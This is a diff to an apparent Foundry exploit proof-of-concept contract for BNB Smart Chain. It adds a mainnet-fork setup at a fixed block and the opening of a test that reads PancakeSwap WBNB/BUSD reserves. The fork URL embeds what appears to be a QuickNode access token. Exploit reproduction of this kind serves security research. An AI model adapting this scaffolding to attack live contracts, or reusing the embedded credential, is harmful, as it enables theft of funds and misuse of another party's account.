@@ -10,6 +10,13 @@ contract Exploit is DSTest {
     IPancakePair wbnbBusdPair = IPancakePair(0xaCAac9311b0096E04Dfe96b6D87dec867d3883Dc);
     IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    uint256 mainnetFork;
+    
+    function setUp() public {
+        mainnetFork = cheats.createFork("https://divine-black-wind.bsc.discover.quiknode.pro/64ab050694137dfcbf4c20daec2e94dc515c1d60/", 18671800);
+        cheats.selectFork(mainnetFork);
+    }
 
     function testExploit() public{
         (uint112 _reserve0, uint112 _reserve1, ) = wbnbBusdPair.getReserves();
